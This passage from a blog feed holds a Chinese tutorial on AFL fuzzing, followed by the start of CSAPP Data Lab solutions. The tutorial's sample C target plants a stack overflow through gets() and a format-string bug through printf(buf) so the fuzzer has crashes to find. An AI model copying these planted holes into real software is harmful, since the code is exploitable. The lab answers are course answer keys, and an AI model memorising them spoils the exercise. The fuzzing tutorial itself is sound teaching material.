href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/</a></p><p><a href="https://e3pem.github.io/2019/07/31/browser/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%A5%E9%97%A8%E4%B9%8Bstarctf-OOB/">https://e3pem.github.io/2019/07/31/browser/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%A5%E9%97%A8%E4%B9%8Bstarctf-OOB/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Chromium </category>
          
      </categories>
      
      
        <tags>
            
            <tag> V8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fuzz&quot;入门&quot;</title>
      <link href="posts/2ba75ee3/"/>
      <url>posts/2ba75ee3/</url>
      
        <content type="html"><![CDATA[<h1 id="Fuzz-简介"><a href="#Fuzz-简介" class="headerlink" title="Fuzz 简介"></a>Fuzz 简介</h1><p><strong>模糊测试</strong> （fuzz testing, fuzzing）是一种<a href="https://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95">软件测试</a>技术。其核心思想是将自动或半自动生成的随机数据输入到一个<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A8%8B%E5%BA%8F">程序</a>中，并监视程序异常，如崩溃，<a href="https://zh.wikipedia.org/wiki/%E6%96%B7%E8%A8%80_(%E7%A8%8B%E5%BC%8F)">断言</a>（assertion）失败，以发现可能的程序错误，比如内存泄漏。模糊测试常常用于检测软件或计算机系统的安全漏洞。</p><h2 id="Fuzz-的发展历程"><a href="#Fuzz-的发展历程" class="headerlink" title="Fuzz 的发展历程"></a>Fuzz 的发展历程</h2><ol><li><p>文件Fuzzing技术</p></li><li><p>语法模板Fuzzing</p></li><li><p>符号执行</p><p> 符号执行在学术界中应用得比较多，工业界相对少一些。在Fuzzing中，通过约束求解新路径的条件值，以增加代码覆盖率，可以一定程度上弥补暴力变异的不足。符号执行主要的挑战在于路径爆炸问题，约束求解能力的局限性，以及性能消耗问题，比如内存和时间消耗过大。</p></li><li><p>代码覆盖引导技术</p><p> 目前业界中基于代码覆盖率的最著名的三大Fuzzer，Google开发的<code>AFL</code>、<code>libfuzzer</code>和<code>honggfuzz</code>，且他们都是开源的，在github上都可以搜索到。</p></li></ol><h2 id="Pros-amp-Cons"><a href="#Pros-amp-Cons" class="headerlink" title="Pros &amp; Cons"></a>Pros &amp; Cons</h2><p>Fuzzing 是对于寻找漏洞是非常有效的，但其不是万能的，以下是它的一些优缺点。</p><p><strong>Pros</strong></p><ul><li>（不需要持续交互）Provides results with little effort - once a fuzzer’s up and running, it can be left for hours, days, or months to look for bugs with no interaction</li><li>Can reveal bugs missed in a manual audit</li><li>（检测程序整体的稳定性）Provides an overall picture of the robustness of the target software</li></ul><p><strong>Cons</strong></p><ul><li>（不能找到所有的漏洞）Won’t find all bugs - fuzzing may miss bugs that don’t trigger a full program crash, and may be less likely to trigger bugs that are only triggered in highly specific circumstances</li><li>（crash 样本比较难分析）The crashing test cases that are produced may be difficult to analyze, as the act of fuzzing doesn’t give you much knowledge of how the software operates internally</li><li>（对于复杂的程序效率会比较低）Programs with complex inputs can require much more work to produce a smart enough fuzzer to get sufficient code coverage</li></ul><h2 id="Anatomy-of-a-fuzzer"><a href="#Anatomy-of-a-fuzzer" class="headerlink" title="Anatomy of a fuzzer"></a>Anatomy of a fuzzer</h2><p>为了有效fuzz，fuzzer需要执行以下任务</p><ul><li>生成测试样本</li><li>记录测试用例的信息</li><li>把测试样例作为输入文件和目标程序（loader）进行对接</li><li>检测并监控 <code>crash</code></li></ul><p>其实上述所说的也就是一个 fuzzer 完整跑一遍的流程的简化。</p><h2 id="What-should-I-fuzz-Finding-the-right-software"><a href="#What-should-I-fuzz-Finding-the-right-software" class="headerlink" title="What should I fuzz? Finding the right software"></a>What should I fuzz? Finding the right software</h2><p>AFL在C或C ++应用程序上效果最好，因此，在 fuzz 之前一个”有效”的软件的攻击面是更为重要的。</p><ol><li>软件是否有示例代码？<ul><li>我们要 fuzz 的软件可能是很复杂很庞大的，如果其拥有大量的实例代码，那么我们快速定位到特定的模块，对每个模块单独 fuzz，这样测试的效果会更加优越。</li></ul></li><li>是否开源？<ul><li>对比开源项目来讲 afl 的效率会高很多，虽然 afl 也支持使用 qemu 进行黑盒 fuzz，但是效率会大打折扣。</li></ul></li><li>特殊样本是否容易收集？<ul><li>我们可能会要 fuzz 不同的文件格式，如果能够快速收集到大量有效的特殊的样本，那么 fuzz 的效率也会随之提高。</li></ul></li></ol><h1 id="AFL简介"><a href="#AFL简介" class="headerlink" title="AFL简介"></a>AFL简介</h1><p>AFL（American Fuzzy Lop）是由安全研究员Micha? Zalewski（<a href="https://twitter.com/lcamtuf">@lcamtuf</a>）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。</p><h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><ul><li>从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）</li><li>选择一些输入文件，作为初始测试集加入输入队列（queue）</li><li>将队列中的文件按一定的策略进行”突变”</li><li>如果经过变异文件更新了覆盖范围，则将其保留添加到队列中</li><li>上述过程会一直循环进行，期间触发了crash的文件会被记录下来</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200803080223.jpeg" alt="afl"></p><blockquote><p>程序插桩:<br>最早是由J.C. Huang 教授提出的，它是在保证被测程序原有逻辑完整性的基础上在程序中插入一些<a href="https://baike.baidu.com/item/%E6%8E%A2%E9%92%88/1846154">探针</a>（又称为“探测仪”，本质上就是进行信息采集的<a href="https://baike.baidu.com/item/%E4%BB%A3%E7%A0%81%E6%AE%B5/9966451">代码段</a>，可以是<a href="https://baike.baidu.com/item/%E8%B5%8B%E5%80%BC%E8%AF%AD%E5%8F%A5/4248688">赋值语句</a>或采集覆盖信息的<a href="https://baike.baidu.com/item/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/4127405">函数调用</a>），通过<a href="https://baike.baidu.com/item/%E6%8E%A2%E9%92%88/1846154">探针</a>的执行并抛出程序运行的<a href="https://baike.baidu.com/item/%E7%89%B9%E5%BE%81/6205236">特征</a>数据，通过对这些数据的<a href="https://baike.baidu.com/item/%E5%88%86%E6%9E%90/4327108">分析</a>，可以获得程序的<a href="https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E6%B5%81/854473">控制流</a>和数据流信息，进而得到<a href="https://baike.baidu.com/item/%E9%80%BB%E8%BE%91%E8%A6%86%E7%9B%96/3231015">逻辑覆盖</a>等动态信息，从而实现测试目的的方法。</p><p>代码覆盖率：<br>软件测试中的一种度量，描述程式中源代码被测试的比例和程度，所得比例称为代码覆盖率。</p></blockquote><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul><li>直接安装：<code>sudo apt install afl</code></li><li><a href="http://lcamtuf.coredump.cx/afl/">官网</a>下载压缩包，解压后在目录中打开终端输入：<code>sudo make;sudo make install</code></li></ul><blockquote><p>推荐自己编译安装，apt 安装不支持黑盒测试。</p></blockquote><h2 id="Fuzz目标"><a href="#Fuzz目标" class="headerlink" title="Fuzz目标"></a>Fuzz目标</h2><p><code>AFL</code>主要用于<code>C/C++</code>程序的测试，所以这是我们寻找软件的最优先规则。</p><p>目标开源与否不是很重要。</p><ul><li><p>对于开源软件：AFL软件进行编译的同时进行插桩，以方便fuzz（效率更高</p></li><li><p>对于闭源软件：配合QEMU直接对闭源的二进制代码进行fuzz</p></li></ul><h2 id="构建语料库"><a href="#构建语料库" class="headerlink" title="构建语料库"></a>构建语料库</h2><p>AFL需要一些初始输入数据（也叫种子文件）作为Fuzzing的起点，这些输入甚至可以是毫无意义的数据，AFL可以通过启发式算法自动确定文件格式结构。</p><p>尽管AFL如此强大，但如果要获得更快的Fuzzing速度，那么就有必要生成一个高质量的语料库（”有用的”输入的集合）</p><h3 id="语料库选择"><a href="#语料库选择" class="headerlink" title="语料库选择"></a>语料库选择</h3><ul><li>有效的输入：尽管有时候无效输入会产生bug和崩溃，但有效输入可以更快的找到更多执行路径。</li><li>尽量小的体积：种子文件最好小于 1KB，较小的文件会不仅可以减少测试和处理的时间，也能节约更多的内存。</li></ul><h3 id="主要来源"><a href="#主要来源" class="headerlink" title="主要来源"></a>主要来源</h3><ol><li><p>使用项目自身提供的测试用例</p></li><li><p>目标程序bug提交页面</p></li><li><p>使用格式转换器，用从现有的文件格式生成一些不容易找到的文件格式：</p></li><li><p>afl源码的testcases目录下提供了一些测试用例</p></li><li><p>其他大型的语料库</p><ul><li><p><a href="http://lcamtuf.coredump.cx/afl/demo/">afl generated image test sets</a></p></li><li><p><a href="https://github.com/google/fuzzer-test-suite">fuzzer-test-suite</a></p></li><li><p><a href="https://samples.libav.org/">libav samples</a></p></li><li><p><a href="http://samples.ffmpeg.org/">ffmpeg samples</a></p></li><li><p><a href="https://github.com/MozillaSecurity/fuzzdata">fuzzdata</a></p></li><li><p><a href="https://gitlab.anu.edu.au/lunar/moonshine">moonshine</a></p></li></ul></li></ol><h3 id="修剪"><a href="#修剪" class="headerlink" title="修剪"></a>修剪</h3><p>网上找到的一些大型语料库中往往包含大量的文件，这时就需要对其精简，这个工作有个术语叫做——语料库蒸馏（Corpus Distillation）。AFL提供了两个工具来帮助我们完成这部工作——<code>afl-cmin</code>和<code>afl-tmin</code>。</p><h4 id="AFL-CMIN"><a href="#AFL-CMIN" class="headerlink" title="AFL-CMIN"></a>AFL-CMIN</h4><p><code>afl-cmin</code>的核心思想是：<strong>尝试找到与语料库全集具有相同覆盖范围的最小子集</strong>。举个例子：假设有多个文件，都覆盖了相同的代码，那么就丢掉多余的文件。其使用方法如下：</p><p><code>$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params]</code></p><p>更多的时候，我们需要从文件中获取输入，这时可以使用<code>@@</code>代替被测试程序命令行中输入文件名的位置。Fuzzer会将其替换为实际执行的文件：</p><p><code>$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] @@</code></p><h4 id="AFL-TMIN"><a href="#AFL-TMIN" class="headerlink" title="AFL-TMIN"></a>AFL-TMIN</h4><p><code>afl-tmin</code>用来缩减文件体积。</p><p><code>afl-tmin</code>有两种工作模式，<code>instrumented mode</code>和<code>crash mode</code>。默认的工作方式是<code>instrumented mode</code>。</p><p>命令： <code>$ afl-tmin -i input_file -o output_file -- /path/to/tested/program [params] @@</code> </p><p>如果指定了参数<code>-x</code>，即<code>crash mode</code>，会把导致程序非正常退出的文件直接剔除。</p><p>命令：<code>$ afl-tmin -x -i input_file -o output_file -- /path/to/tested/program [params] @@</code></p><h1 id="AFL实例"><a href="#AFL实例" class="headerlink" title="AFL实例"></a>AFL实例</h1><h2 id="开始Fuzz"><a href="#开始Fuzz" class="headerlink" title="开始Fuzz"></a>开始Fuzz</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="number">66</span>) &#123;</span><br><span class="line">        raise(SIGSEGV); <span class="comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="number">6</span>) &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it is good!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    gets(buf);<span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);<span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    vuln(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir fuzz_test; <span class="built_in">cd</span> fuzz_test </span><br><span class="line">$ mkdir fuzz_in fuzz_out</span><br><span class="line">$ afl-gcc -g -o afl_test afl_test.c //插桩编译</span><br><span class="line">$ sudo su</span><br><span class="line">$ <span class="built_in">echo</span> core &gt;/proc/sys/kernel/core_pattern</span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">$ afl-fuzz -i fuzz_in -o fuzz_out ./afl_test</span><br></pre></td></tr></table></figure><blockquote><p>ps：随便在 fuzz_in 放一些种子文件即可。</p><p>命令解析：</p><ul><li><p><code>-i</code>：指定测试样本的路径</p></li><li><p><code>-o</code>：指定输出结果的路径</p></li><li><p>更详细见：<code>$ afl-fuzz -h</code></p></li><li><p><code>echo core &gt;/proc/sys/kernel/core_pattern</code></p><p>  在执行<code>afl-fuzz</code>前，如果系统配置为将核心转储文件（core）通知发送到外部程序。 将导致将崩溃信息发送到Fuzzer之间的延迟增大，进而可能将崩溃被误报为超时，所以我们得临时修改<code>core_pattern</code>文件</p></li></ul></blockquote><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200803145522.png"></p><h2 id="窗口解读"><a href="#窗口解读" class="headerlink" title="窗口解读"></a>窗口解读</h2><ul><li><p>Process timing:Fuzzer运行时长、以及距离最近发现的路径、崩溃和挂起经过了多长时间。</p></li><li><p>Overall results：Fuzzer当前状态的概述。</p></li><li><p>Cycle progress：我们输入队列的距离。</p></li><li><p>Map coverage：目标二进制文件中的插桩代码所观察到覆盖范围的细节。</p></li><li><p>Stage progress：Fuzzer现在正在执行的文件变异策略、执行次数和执行速度。</p></li><li><p>Findings in depth：有关我们找到的执行路径，异常和挂起数量的信息。</p></li><li><p>Fuzzing strategy yields：关于突变策略产生的最新行为和结果的详细信息。</p></li><li><p>Path geometry：有关Fuzzer找到的执行路径的信息。</p></li><li><p>CPU load：CPU利用率</p></li></ul><h2 id="分析crash"><a href="#分析crash" class="headerlink" title="分析crash"></a>分析crash</h2><p>因为程序本身很简单，跑了几分钟跑出来 4 个<code>crash</code></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ xxd id:000004,sig:06,src:000000,op:havoc,rep:64</span><br><span class="line"></span><br><span class="line">00000000: 4100 7f00 00f1 83ec ff00 7f00 00f1 7fff  A...............</span><br><span class="line">00000010: ffff 0c41 007f 0000 f1a2 ffff ff0b fd5f  ...A..........._</span><br><span class="line">00000020: 8000 0000 fe0c 5f6b 2000 ff0c 6200 7f0c  ......_k ...b...</span><br><span class="line">00000030: 5f6b 00f1 7fec ff00 7f00 00f1 7fff ffff  _k..............</span><br><span class="line">00000040: 0c41 007f 0000 f1a2 ffff ff0b fd5f 8000  .A..........._..</span><br><span class="line">00000050: 0000 fe0c 5f6b 2000 ff0c 6200 7f0c 5f6b  ...._k ...b..._k</span><br><span class="line">00000060: 0000 00fe 8108 7f00 0000 00fe 405f 6b00  ............@_k.</span><br><span class="line">00000070: 00ff 0000 f17f ecff 007f 0000 f17f ffff  ................</span><br><span class="line">00000080: ff0c 4100 7f00 00f1 a2ff ffff 0bfd 5f80  ..A..........._.</span><br><span class="line">00000090: 0000 00fe 0c5f 6b20 0000 00fe 7e0c 4100  ....._k ....~.A.</span><br><span class="line">000000a0: 7f00 00f1 7fff ffff 0bec 5f80 0000 00fe  .........._.....</span><br><span class="line">000000b0: 0c5f 6700 0000 fe7e 0800 0000 fe81 087f  ._g....~........</span><br><span class="line">000000c0: 0000 0000 fe40 5f6b 0000 00ff 4100 7f00  .....@_k....A...</span><br><span class="line">000000d0: 00f1 a2ff ffff 0bfd 5f80 0000 00fe 0c5f  ........_......_</span><br><span class="line">000000e0: 6b20 00ff 0c62 007f 0c5f 6b00 0000 fe72  k ...b..._k....r</span><br><span class="line">000000f0: 087f 0000 0000 fe40 5f6b 0000 ff0c 4100  .......@_k....A.</span><br><span class="line">00000100: 7f00 00f1 7fff ffff 0bec 5f80 0000 00fe  .........._.....</span><br><span class="line">00000110: 0c5f 6700 0000 fe7e 0c41 007f 0000 f17f  ._g....~.A......</span><br><span class="line">00000120: ffff ff0b ec5f 8000 0000 fe0c 5f67 0000  ....._......_g..</span><br><span class="line">00000130: 00fe 7e08                                ..~.</span><br></pre></td></tr></table></figure><p>可以看出来是由栈溢出所导致的。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ xxd id:000002,sig:06,src:000000,op:havoc,rep:128</span><br><span class="line">00000000: 256e                                     %n</span><br></pre></td></tr></table></figure><p>格式化字符串导致。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxd id:000000,sig:11,src:000001,op:havoc,rep:4</span><br><span class="line">00000000: 4672 6497 7364                           Frd.sd</span><br></pre></td></tr></table></figure><p>输入的字符串的首字符为F并且长度为6，则异常退出</p><h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><p>黑盒测试要用到AFL的QEMU模式了。</p><p>所以我们需要再额外装一下东西。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~</span><br><span class="line">$ sudo apt-get install libini-config-dev libtool-bin automake bison libglib2.0-dev -y</span><br><span class="line">$ <span class="built_in">cd</span> afl-2.52/qemu_mode</span><br><span class="line">$ ./build_qemu_support.sh</span><br><span class="line">$ <span class="built_in">cd</span> .. </span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure><p>我们接着用刚刚的源文件重新编译然后进行新的黑盒 fuzz。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -g -o afl_test2 afl_test.c</span><br><span class="line">$ afl-fuzz -i fuzz_in -o fuzz_out -Q ./afl_test2</span><br></pre></td></tr></table></figure><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200804111331.png" alt="image"></p><h2 id="输出结果"><a href="#输出结果" class="headerlink" title="输出结果"></a>输出结果</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fuzz_out/</span><br><span class="line">├── crashes</span><br><span class="line">│   ├── id:000000,sig:06,src:000000,op:havoc,rep:32</span><br><span class="line">│   ├── id:000001,sig:06,src:000000,op:havoc,rep:32</span><br><span class="line">│   ├── id:000002,sig:11,src:000001,op:havoc,rep:2</span><br><span class="line">│   ├── id:000003,sig:06,src:000002,op:havoc,rep:16</span><br><span class="line">│   ├── id:000004,sig:11,src:000000,op:havoc,rep:128</span><br><span class="line">│   ├── id:000005,sig:11,src:000002,op:havoc,rep:16</span><br><span class="line">│   └── README.txt</span><br><span class="line">├── fuzz_bitmap</span><br><span class="line">├── fuzzer_stats</span><br><span class="line">├── hangs</span><br><span class="line">├── plot_data</span><br><span class="line">└── queue</span><br><span class="line">    ├── id:000000,orig:test</span><br><span class="line">    ├── id:000001,src:000000,op:arith8,pos:0,val:-30,+cov</span><br><span class="line">    └── id:000002,src:000000,op:arith8,pos:0,val:-35,+cov</span><br><span class="line"></span><br><span class="line">3 directories, 13 files</span><br></pre></td></tr></table></figure><p><code>queue</code>：存放所有具有独特执行路径的测试用例。<br><code>crashes</code>：导致目标接收致命<code>signal</code>而崩溃的独特测试用例。<br><code>crashes/README.txt</code>：保存了目标执行这些<code>crash</code>文件的命令行参数。<br><code>hangs</code>：导致目标超时的独特测试用例。<br><code>fuzzer_stats</code>：<code>afl-fuzz</code>的运行状态。<br><code>plot_data</code>：用于<code>afl-plot</code>绘图。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://zh.wikipedia.org/wiki/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95">https://zh.wikipedia.org/wiki/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95</a></p><p><a href="https://www.f-secure.com/en/consulting/our-thinking/15-minute-guide-to-fuzzing">https://www.f-secure.com/en/consulting/our-thinking/15-minute-guide-to-fuzzing</a></p><p><a href="https://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/">https://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/</a></p><p><a href="https://paper.seebug.org/841/#2_3">https://paper.seebug.org/841/#2_3</a></p><p><a href="https://paper.seebug.org/842/#_1">https://paper.seebug.org/842/#_1</a></p><p><a href="https://xz.aliyun.com/t/4314#toc-8">https://xz.aliyun.com/t/4314#toc-8</a></p>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
          <category> Afl </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
            <tag> Build </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP Lab</title>
      <link href="posts/ab6e7b0/"/>
      <url>posts/ab6e7b0/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>记录一下 css app lab，<a href="http://csapp.cs.cmu.edu/3e/labs.html">下载地址</a></p><p>代码放在了 <a href="https://github.com/focu5/CSAPP-Labs">Github</a></p><h3 id="Data-Lab"><a href="#Data-Lab" class="headerlink" title="Data Lab"></a>Data Lab</h3><h4 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h4><p><code>x ^ y = (~x &amp; y) | (x &amp; ~y) </code></p><p>题目限制我们仅使用 <code>&amp; ～</code>，所以我们想办法代替 <code>｜</code> 即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~(~(~x &amp; y) &amp; (~(x &amp; ~y)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h4><p>以补码形式返回最小的整数。即：符号为是1，其余均为0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h4><p>如果是最大的整数则返回1.</p><p>注意三个比较讨厌的数：</p><blockquote><p>0x7fffffff：01111111111111111111111111111111<br>0xffffffff：11111111111111111111111111111111<br>0x80000000：10000000000000000000000000000000</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !((~x^(x+<span class="number">1</span>)) | !(x+<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h4><p>判断所有奇数位是否都为1.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> y = <span class="number">0xaa</span> + (<span class="number">0xaa</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">  y = y+ (y &lt;&lt; <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> !((y &amp; x) ^ y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路：可以先自行构造出一个所有奇数位都为1的标准数，在进行比较。</p><h4 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h4><p>返回相反数，常识题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h4><p>计算输入值是否是数字 0-9 的 <code>ASCII</code> 值。</p><p>思路：先观察0x30-0x39的二进制数有什么特点，发现0x30-0x3f之间的第4、5位均为1。假设 x 是 0 - 9 之间的一个数，！(x &lt;&lt; 4 ^ 0x3) = 1，y = x + 0x6， ！(y &lt;&lt; 4 ^ 0x3) = 1，确保这两个同时成立即可判断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> y = x &gt;&gt; <span class="number">4</span>;</span><br><span class="line">  x = x + <span class="number">0x6</span>;</span><br><span class="line">  <span class="keyword">int</span> z = x &gt;&gt; <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">return</span> !(y 